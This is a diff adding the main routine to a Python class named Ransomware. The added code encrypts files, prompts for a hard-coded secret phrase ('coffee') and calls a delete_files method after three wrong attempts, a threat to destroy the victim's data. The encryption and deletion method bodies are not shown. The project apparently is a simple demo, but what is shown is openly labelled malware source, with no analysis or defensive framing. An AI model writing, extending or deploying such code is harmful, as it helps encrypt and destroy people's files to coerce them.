@@ -34,3 +34,26 @@ class Ransomware:
 
 if __name__ == "__main__":
     ransomware = Ransomware()
+
+    print("encrypting files...")
+    ransomware.encrypt_files()
+
+    secret_phrase = "coffee"
+    number_of_attempts = 0
+    while True:
+        print(
+            f"enter the secret phrase in less than {3 - number_of_attempts} attempts or all your files will be deleted:")
+        user_input = input()
+        if user_input == secret_phrase:
+            print("\ndecrypting files...")
+            ransomware.decrypt_files()
+            break
+        else:
+            number_of_attempts += 1
+            if number_of_attempts == 3:
+                print("\nyou have failed to enter the secret phrase in 3 attempts.")
+                ransomware.delete_files()
+                break
+            else:
+                print("\nincorrect secret phrase. try again!")
+                continue
